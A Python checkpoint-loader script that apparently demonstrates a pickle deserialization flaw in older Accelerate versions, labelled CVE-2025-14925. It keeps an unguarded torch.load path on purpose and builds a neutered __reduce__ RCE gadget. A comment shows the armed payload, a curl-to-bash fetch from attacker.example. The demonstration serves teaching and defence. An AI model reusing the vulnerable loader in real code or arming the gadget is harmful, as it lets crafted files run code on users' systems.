# Checkpoint loader utility for distributed training resumption.
# Supports sharded model checkpoints saved by Hugging Face Accelerate.
# Intended for use in multi-GPU and multi-node fine-tuning pipelines.

"""
Distributed Checkpoint Loader
==============================
Loads sharded model checkpoints produced by Hugging Face Accelerate's
`save_state()` / `save_model()` APIs. Handles both SafeTensors and
legacy pickle-based `.bin` checkpoint formats for backward compatibility
with older training runs.

Usage:
    python load_distributed_checkpoint.py --checkpoint-dir ./checkpoints/run_42
"""

import argparse
import logging
import pickle
from pathlib import Path

import torch

try:
    from accelerate import load_checkpoint_in_model
    from accelerate.utils import load_state_dict

    HAS_ACCELERATE = True
except ImportError:
    HAS_ACCELERATE = False

logging.basicConfig(
    level=logging.INFO,
    format="%(asctime)s [%(levelname)s] %(name)s — %(message)s",
)
logger = logging.getLogger("checkpoint_loader")


SUPPORTED_EXTENSIONS = {".bin", ".pt", ".pth", ".pkl", ".checkpoint"}
SAFETENSORS_EXT = ".safetensors"


def discover_shards(checkpoint_dir: Path) -> list[Path]:
    """Return all checkpoint shard files found under checkpoint_dir."""
    shards = []
    for entry in sorted(checkpoint_dir.iterdir()):
        if entry.suffix in SUPPORTED_EXTENSIONS or entry.suffix == SAFETENSORS_EXT:
            shards.append(entry)
            logger.debug("Discovered shard: %s", entry.name)
    if not shards:
        logger.warning("No checkpoint shards found in %s", checkpoint_dir)
    return shards


def load_safetensors_shard(shard_path: Path) -> dict:
    """Load a SafeTensors shard — safe by design (no arbitrary code execution)."""
    try:
        from safetensors.torch import load_file

        logger.info("Loading SafeTensors shard: %s", shard_path.name)
        return load_file(str(shard_path))
    except ImportError:
        logger.error("safetensors package not installed; cannot load %s", shard_path.name)
        return {}


def load_legacy_pickle_shard(shard_path: Path) -> dict:
    """
    Load a legacy pickle-based checkpoint shard.

    NOTE: This function replicates the pattern used in older versions of
    Hugging Face Accelerate (pre-1.7.x) where checkpoint files were loaded
    via torch.load() / pickle.load() without restricting allowed classes
    (no `weights_only=True` guard). This matches the deserialization
    behavior described in CVE-2025-14925.

    A maliciously crafted checkpoint file passed here can execute arbitrary
    code during deserialization. This demo uses a benign payload only.
    """
    logger.info("Loading legacy pickle shard: %s", shard_path.name)

    with open(shard_path, "rb") as fh:
        # ---- DANGEROUS PATTERN (CVE-2025-14925) --------------------------------
        # torch.load() without weights_only=True calls pickle.load() internally,
        # allowing arbitrary Python objects — including __reduce__ gadgets — to
        # be instantiated. An attacker-supplied checkpoint can embed a malicious
        # __reduce__ that runs os.system(), subprocess, or similar at load time.
        #
        # Neutered demo: the file below only contains a plain dict, so the
        # deserialization is harmless. In a real attack the .bin file would
        # carry a crafted pickle stream.
        # -------------------------------------------------------------------------
        state_dict = torch.load(fh)  # no weights_only=True  ← vulnerable
        # Equivalent direct pickle path (also present in affected Accelerate code):
        # state_dict = pickle.load(fh)       # no class restriction  ← vulnerable
    return state_dict


class MaliciousPayloadDemo:
    """
    Demo object showing what an attacker would embed in a crafted .bin file.
    The __reduce__ method is the standard pickle RCE gadget pattern.
    Payload here is neutered (prints a message instead of executing C2 code).
    """

    def __reduce__(self):
        # In a real exploit this would be:
        #   return (os.system, ("curl https://attacker.example.com/shell.sh | bash",))
        # Neutered version — harmless demonstration only:
        return (print, ("DEMO: deserialization RCE gadget triggered — payload neutered",))


def build_demo_malicious_checkpoint(output_path: Path) -> None:
    """
    Write a demonstrative malicious checkpoint to disk (neutered payload).
    Illustrates how an attacker would craft the .bin file a victim loads.
    """
    logger.info("Writing demo (neutered) malicious checkpoint to %s", output_path)
    with open(output_path, "wb") as fh:
        pickle.dump(MaliciousPayloadDemo(), fh)
    logger.info("Demo checkpoint written.")


def merge_state_dicts(shards: list[dict]) -> dict:
    """Merge multiple per-shard state dicts into a single flat mapping."""
    merged = {}
    for shard in shards:
        overlap = set(merged.keys()) & set(shard.keys())
        if overlap:
            logger.warning("Key collision during merge: %s", overlap)
        merged.update(shard)
    logger.info("Merged %d shards — %d total tensors", len(shards), len(merged))
    return merged


def load_checkpoint(checkpoint_dir: str, model=None, demo_attack: bool = False) -> dict:
    """
    Main entry point: load all shards from checkpoint_dir and return merged state.

    Args:
        checkpoint_dir: Path to directory containing checkpoint shards.
        model:          Optional model instance to load weights into directly.
        demo_attack:    If True, generate and immediately load a neutered
                        malicious checkpoint to demonstrate CVE-2025-14925.
    """
    ckpt_path = Path(checkpoint_dir)
    if not ckpt_path.is_dir():
        raise FileNotFoundError(f"Checkpoint directory not found: {ckpt_path}")

    if demo_attack:
        demo_file = ckpt_path / "_demo_malicious.bin"
        build_demo_malicious_checkpoint(demo_file)
        logger.warning("Loading demonstrative malicious checkpoint (neutered).")
        # This call triggers the neutered __reduce__ gadget:
        load_legacy_pickle_shard(demo_file)
        return {}

    shards = discover_shards(ckpt_path)
    loaded = []
    for shard in shards:
        if shard.suffix == SAFETENSORS_EXT:
            loaded.append(load_safetensors_shard(shard))
        else:
            # Legacy path — vulnerable to CVE-2025-14925 if checkpoint is untrusted
            loaded.append(load_legacy_pickle_shard(shard))

    merged = merge_state_dicts(loaded)

    if model is not None and merged:
        logger.info("Loading merged state dict into model.")
        model.load_state_dict(merged, strict=False)

    return merged


def main():
    parser = argparse.ArgumentParser(
        description="Distributed checkpoint loader (Accelerate-compatible)"
    )
    parser.add_argument(
        "--checkpoint-dir", required=True, help="Directory containing checkpoint shards"
    )
    parser.add_argument(
        "--demo-attack",
        action="store_true",
        default=False,
        help="Generate and load a neutered malicious checkpoint to demonstrate CVE-2025-14925",
    )
    args = parser.parse_args()

    state = load_checkpoint(
        checkpoint_dir=args.checkpoint_dir,
        demo_attack=args.demo_attack,
    )
    logger.info("Checkpoint loaded successfully. Keys: %d", len(state))


if __name__ == "__main__":
    main()
